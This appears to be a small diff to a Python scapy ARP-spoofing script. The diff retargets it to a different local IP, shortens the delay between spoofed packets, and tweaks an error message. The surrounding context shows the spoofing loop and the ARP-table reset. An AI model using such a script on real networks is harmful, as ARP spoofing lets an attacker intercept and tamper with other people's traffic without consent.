@@ -1,3 +1,4 @@
+from ipaddress import ip_address
 import scapy.all as scapy
 import time
 
@@ -5,7 +6,7 @@ router_ip = "192.168.29.1"
 # router_mac = "18:82:8c:fc:c8:1b"
 
 
-destination_ip = "192.168.29.87"
+destination_ip = "192.168.29.6"
 # destination_mac = "b4:f5:09:3c:2d:f6"  # use net discover
 
 
@@ -26,7 +27,7 @@ def get_mac_address(ip):
                              iface="wlan0",  verbose=False)[0]
         return answered[0][1].hwsrc
     except Exception as ex:
-        print("Exception Occured while requesting mac_address for - " + str(ip))
+        print("Exception while getting mac_address for" + str(ip))
 
 
 def spoof(target_ip, spoof_ip):
@@ -56,7 +57,7 @@ def begin_process():
             spoof(router_ip, destination_ip)
             print("\r[+] packets sent: " + str(sent_packet_count), end="")
             sent_packet_count += 2
-            time.sleep(3)
+            time.sleep(1)
     except KeyboardInterrupt:
         print(
             "\n [-] Detected a beyboard interrupt ..... Resetting ARP Tables... Please wait")
